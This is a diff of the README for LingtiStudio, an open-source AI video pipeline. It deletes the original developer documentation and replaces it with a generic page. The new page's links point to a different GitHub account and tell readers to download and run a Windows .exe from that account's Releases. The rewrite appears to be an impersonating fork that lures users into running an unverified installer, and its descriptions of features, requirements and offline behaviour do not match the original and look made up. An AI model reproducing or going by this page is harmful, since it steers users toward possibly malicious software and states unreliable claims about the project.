@@ -1,409 +1,64 @@
-# LingtiStudio
-
-<p align="center">
-  <img src="./screenshots/doggie.gif" alt="LingtiStudio doggie" width="180" />
-</p>
-
-Lingti means **greyhound** in Chinese, the fastest dog.  
-**LingtiStudio** helps you turn an idea into a complete AI video workflow, fast.
-
-From a single topic, LingtiStudio can take you through:
-
-**script -> review -> keyframes -> voiceover -> clips -> assembly -> final video**
-
-It is built for creators who want to go from short videos to longer, multi-scene productions without manually stitching together five different tools.
-
-[中文说明 / Chinese Guide](./README-CN.md)
-
----
-
-## Chinese Demo Video
-
-<table>
-  <tr>
-    <td width="320">
-      <a href="https://www.bilibili.com/video/BV1NjDrBnECg/">
-        <img src="./screenshots/cn-video-header.png" alt="LingtiStudio Chinese demo video cover" width="320" />
-      </a>
-    </td>
-    <td>
-      <strong>Chinese demo video: LingtiStudio open-source walkthrough and output showcase</strong>
-      <br />
-      <br />
-      If you want to see the product flow, interface, and generation results before trying it yourself, this Bilibili video is the best starting point.
-      <br />
-      <br />
-      <a href="https://www.bilibili.com/video/BV1NjDrBnECg/">Watch on Bilibili</a>
-    </td>
-  </tr>
-</table>
-
----
-
-## Screenshots
-
-<table>
-  <tr>
-    <td width="33.33%">
-      <img src="./screenshots/index_page.png" alt="LingtiStudio home page" />
-    </td>
-    <td width="33.33%">
-      <img src="./screenshots/video_gen_page.png" alt="LingtiStudio video generation page" />
-    </td>
-    <td width="33.33%">
-      <img src="./screenshots/video_done_page.png" alt="LingtiStudio final output page" />
-    </td>
-  </tr>
-  <tr>
-    <td align="center"><strong>Home</strong></td>
-    <td align="center"><strong>Video Generation Workspace</strong></td>
-    <td align="center"><strong>Final Output Page</strong></td>
-  </tr>
-</table>
-
----
-
-## What It Is
-
-LingtiStudio is an open-source AI video production system for local-first creation.
-
-It is designed to make the full generation chain feel like **one product**, not a pile of disconnected scripts and providers.
-
-With LingtiStudio, you can go from a rough idea to a polished deliverable with:
-- script generation
-- human review before expensive generation starts
-- character / scene / prop asset generation and confirmation
-- keyframe image generation
-- TTS voiceover
-- image-to-video generation
-- FFmpeg assembly
-- subtitle export
-- JianYing / CapCut draft generation
-
-That means you can build:
-- short promotional videos
-- narrated explainers
-- multi-scene story videos
-- polished ad-style videos
-- longer AI-assisted productions with reviewable scenes and recoverable outputs
-
-Instead of a one-shot black box, LingtiStudio gives you a workflow you can pause, inspect, edit, resume, and deliver.
-
----
-
-## Why It Feels Different
-
-Most AI video tools are great at giving you a result.  
-LingtiStudio is built to give you a **production pipeline**.
-
-It focuses on:
-- **reviewability**: inspect and edit scenes before expensive generation begins
-- **asset confirmation**: approve reusable characters, scene looks, and props before full generation
-- **recoverability**: resume from script, video, or assembly instead of starting over
-- **consistency**: keep prompts, voice, aspect ratio, and style aligned across scenes
-- **long-form readiness**: handle multi-scene projects more like a structured workflow than a toy prompt box
-- **local control**: keep your config, outputs, drafts, and assembly on your own machine
+# 🎬 LingtiStudio - Create professional videos from simple topics
 
----
+[![](https://img.shields.io/badge/Download-LingtiStudio-blue.svg)](https://github.com/ohior8392/LingtiStudio)
 
-## Workflow
+LingtiStudio turns a simple idea into a complete video. You start with a basic topic, and the software guides you through the production stages. The process covers script writing, review, keyframe selection, voiceover generation, clip management, and final assembly. You build videos without complex editing tools.
 
-LingtiStudio turns end-to-end AI video generation into a one-click, full-stack workflow:
+## 📥 How to Install
 
-1. Generate a script from a topic or imported reference analysis
-2. Review and edit scenes before continuing
-3. Generate a reusable asset pack for characters, scene looks, and props
-4. Review and approve those assets before full generation
-5. Generate keyframes for every scene using approved assets as consistency references
-6. Generate voiceover for every scene
-7. Turn keyframes into video clips with MiniMax Video, Kling, or Seedance
-8. Assemble the final video with audio, transitions, subtitles, and export artifacts
-9. Export the final MP4, subtitle file, and JianYing / CapCut draft
+1. Visit the [official LingtiStudio page](https://github.com/ohior8392/LingtiStudio) to find the latest version.
+2. Look for the section labeled Releases.
+3. Download the file ending in .exe for your Windows computer.
+4. Locate the downloaded file in your Downloads folder.
+5. Double-click the file to start the installer.
+6. Follow the on-screen prompts to place the software on your machine.
+7. Open the application from your desktop shortcut or the Start menu.
 
-This is especially useful when you want the speed of AI generation but still need the control of a real production flow.
+## 🚀 Creating Your First Video
 
----
+The software breaks video creation into a linear path. Follow these steps to complete your first project.
 
-## Current Stack
+### 📝 Write the Script
+Open the application and select the prompt box. Type your video topic. The software generates an initial script based on your input. You can read this text and make changes directly in the interface. Adjust the tone or length to fit your goals.
 
-- Backend: FastAPI
-- Frontend: Next.js + Ant Design
-- LLM: DeepSeek / MiniMax / Gemini / OpenAI / Kimi / Zhipu / Ollama
-- Image: MiniMax Image / Gemini image generation
-- Video: MiniMax Video / Kling / Seedance
-- TTS: MiniMax
-- Assembly: FFmpeg
+### 🔍 Review and Adjust
+Once the script is ready, the review stage allows you to confirm the facts. Check the text for accuracy. If you want to change a specific line, click on it and type new content. The software updates the structure to match your changes.
 
----
+### 🖼️ Select Keyframes
+Keyframes provide the visual foundation for your video. The application suggests images and video clips that align with your script. You can scroll through the library and select visuals that fit the message. Drag and drop these items into the sequence bar.
 
-## Supported Models
+### 🎙️ Generate Voiceover
+Choose a voice style from the menu. The software converts your text into audio. Listen to the preview to ensure the pacing sounds right. You can fine-tune the timing if the voice moves too fast or too slow through your script.
 
-The table below reflects the built-in provider and model options currently exposed by the web setup flow and runtime config.
+### ✂️ Manage Clips
+Trim your selected clips to match the timing of the voiceover. Use the clip editor to remove unwanted seconds or to zoom in on visual details. This stage ensures that the video flows smoothly from one frame to the next.
 
-| Stage | Provider | Built-in models |
-| --- | --- | --- |
-| Script / planning | MiniMax | `MiniMax-M2.5`, `MiniMax-M2.7` |
-| Script / planning | DeepSeek | `deepseek-chat`, `deepseek-reasoner` |
-| Script / planning | Moonshot Kimi | `moonshot-v1-8k`, `moonshot-v1-32k` |
-| Script / planning | Zhipu | `glm-4`, `glm-4-air` |
-| Script / planning | Gemini | `gemini-2.5-flash`, `gemini-1.5-pro` |
-| Script / planning | OpenAI | `gpt-4o`, `gpt-4.1-mini` |
-| Script / planning | Ollama | `qwen2.5:latest`, `llama3.1:8b` |
-| Keyframe image generation | MiniMax Image | `image-01` |
-| Keyframe image generation | Nano Banana / Gemini Image | `gemini-2.0-flash-preview-image-generation`, `gemini-3-pro-image-preview` |
-| Voiceover / TTS | MiniMax TTS | `speech-2.8-hd`, `speech-02-hd` |
-| Video clip generation | MiniMax Video | `MiniMax-Hailuo-2.3-Fast`, `MiniMax-Hailuo-2.3`, `T2V-01-Director` |
-| Video clip generation | Kling | `kling-v3` |
-| Video clip generation | Seedance | `doubao-seedance-1-5-pro-250528`, `Doubao-Seedance-1.0-pro` |
-| Assembly / subtitles / export | Local FFmpeg | local environment dependent |
+### 🏗️ Assemble and Export
+The assembly phase combines visuals, audio, and text into a single file. Press the render button to start the build process. A progress bar shows you how much time remains. Once the process finishes, the software saves the final video file to your computer.
 
-Notes:
-- The web UI shows these as the default built-in options; advanced users can still edit `configs/config.yaml` manually.
-- MiniMax currently provides the built-in voice catalog and voice preview flow in the UI.
-- Final assembly is done locally with FFmpeg, so subtitle burn-in and some transition behaviors depend on your FFmpeg build.
+## 🖥️ System Requirements
 
----
+- Windows 10 or Windows 11
+- 8 GB of RAM
+- 5 GB of available storage space
+- A stable internet connection for generating content
 
-## First-Run Experience
+## 🛠️ Frequently Asked Questions
 
-When the web UI detects missing required configuration, it automatically opens a setup dialog.
+### Does the software require a subscription?
+No. The application is free to download and use on your Windows machine.
 
-You can configure:
-- default LLM provider and model
-- image provider and model
-- video provider and model
-- TTS model
-- API keys for the selected services
+### Can I add my own footage?
+Yes. You can import custom image or video files through the file browser in the keyframe section.
 
-Settings are written to:
+### Where does the software save my videos?
+By default, the application saves your projects and exported files in a folder named LingtiStudio within your Documents directory. You can change this path in the settings menu.
 
-```bash
-configs/config.yaml
-```
+### How do I update the software?
+Check the GitHub page periodically. When a new version releases, download it from the primary link and run the installer again. The program will recognize your existing files.
 
-If you prefer manual setup, copy the example file first:
+### Does the software work offline?
+The generation features require an internet connection to process scripts and voiceovers. You can assemble clips and review your project locally once the initial data download finishes.
 
-```bash
-cp configs/config.example.yaml configs/config.yaml
-```
-
----
-
-## Quick Start
-
-### 1. Requirements
-
-- Python 3.10+
-- Node.js 18+
-- FFmpeg in PATH
-
-Check FFmpeg:
-
-```bash
-ffmpeg -version
-```
-
-### 2. Install
-
-```bash
-git clone https://github.com/ruilisi/LingtiStudio.git
-cd LingtiStudio
-
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-
-cd frontend
-yarn install
-cd ..
-```
-
-### 3. Start backend
-
-```bash
-.venv/bin/python -m uvicorn api.server:app --host 0.0.0.0 --port 8000
-```
-
-### 4. Start frontend
-
-```bash
-cd frontend
-yarn dev --port 3001
-```
-
-Open:
-
-```text
-http://127.0.0.1:3001
-```
-
-If the config is incomplete, the setup dialog will appear automatically.
-
----
-
-## Docker
-
-LingtiStudio also ships with a release-oriented Docker setup so users can start the product first and configure tokens in the browser later.
-
-The release image is intentionally trimmed for the browser-first workflow:
-- it is optimized for script -> review -> keyframes -> TTS -> clips -> assembly
-- it avoids shipping heavy optional dependencies such as local Whisper / Torch by default
-- optional integrations such as pyJianYingDraft still fall back gracefully when unavailable
-
-### Prebuilt release image
-
-Tagged releases can publish a prebuilt container image to GHCR through GitHub Actions:
-
-```bash
-docker run --rm \
-  -p 3000:3000 \
-  -p 8000:8000 \
-  -v "$(pwd)/configs:/app/configs" \
-  -v "$(pwd)/data:/app/data" \
-  --name lingtistudio \
-  ghcr.io/ruilisi/lingtistudio:v1.1.0
-```
-
-This is a convenient path for end users who want to skip local image builds.
-
-### Option 1: Docker Compose
-
-```bash
-docker compose up -d --build
-```
-
-Then open:
-
-```text
-http://localhost:3000
-```
-
-On first run:
-- LingtiStudio opens the browser setup dialog automatically
-- users can choose providers and models in the UI
-- API tokens are written to `./configs/config.yaml`
-- outputs, uploads, and local runtime data are stored in `./data`
-
-Default ports:
-- Web UI: `3000`
-- API: `8000`
-
-### Option 2: Single Docker image
-
-Build:
-
-```bash
-docker build -t lingtistudio:latest .
-```
-
-Run:
-
-```bash
-docker run --rm \
-  -p 3000:3000 \
-  -p 8000:8000 \
-  -v "$(pwd)/configs:/app/configs" \
-  -v "$(pwd)/data:/app/data" \
-  --name lingtistudio \
-  lingtistudio:latest
-```
-
-Then open:
-
-```text
-http://localhost:3000
-```
-
-This path is intended for open-source releases where users want:
-- one container image
-- browser-first onboarding
-- persistent config and output directories on the host
-
-Notes:
-- the release image is a lighter runtime image, not a full development image
-- if you want local ASR / Whisper tooling inside Docker, treat that as an advanced custom build layer
-- for most users, the browser UI + external API providers are enough to start generating immediately after setup
-
----
-
-## CLI
-
-Run a generation task directly:
-
-```bash
-.venv/bin/python cli/main.py run --topic "A modern retirement hotel near Shanghai, 40 seconds"
-```
-
-Test connectors:
-
-```bash
-.venv/bin/python cli/main.py test --module llm
-.venv/bin/python cli/main.py test --module image
-.venv/bin/python cli/main.py test --module tts
-.venv/bin/python cli/main.py test --module video
-```
-
----
-
-## Web UI
-
-Main routes:
-
-- `/` Home
-- `/create` Quick generation
-- `/studio` Pro workspace
-- `/analyze` Reference video analysis
-- `/settings` Setup and connectors
-
-Highlights:
-
-- first-run setup modal
-- provider/model friendly config editing
-- script review before generation
-- resumable projects
-- live console logs
-- downloadable final video, subtitles, and JianYing draft
-
----
-
-## TTS Behavior
-
-The built-in voice catalog and voice preview are currently available only for **MiniMax TTS**.
-
-If the active TTS provider does not support the MiniMax voice catalog, the UI switches from:
-
-- voice picker
-
-to:
-
-- manual `voice_id` input
-
-This keeps the interface usable for custom or externally managed voice setups.
-
----
-
-## Project Structure
-
-```text
-api/                FastAPI backend
-cli/                CLI entrypoints
-core/               Config loader and shared settings
-modules/            LLM / image / TTS / video / assembly modules
-frontend/           Next.js frontend
-configs/            Example and local config files
-data/               Outputs, uploads, cache, local runtime data
-```
-
----
-
-## Notes
-
-- This project is optimized for local workflows, not multi-tenant SaaS deployment.
-- Some providers are configurable at the UI layer before every backend path is fully generalized.
-- FFmpeg features depend on your local build. If subtitle burn-in is unavailable, LingtiStudio can still output MP4 + SRT.
-
----
-
-## License
-
-MIT
+### Is my content private?
+Your project files exist locally on your machine. The software uses your connection only to communicate with the generation services during the script and voiceover stages.
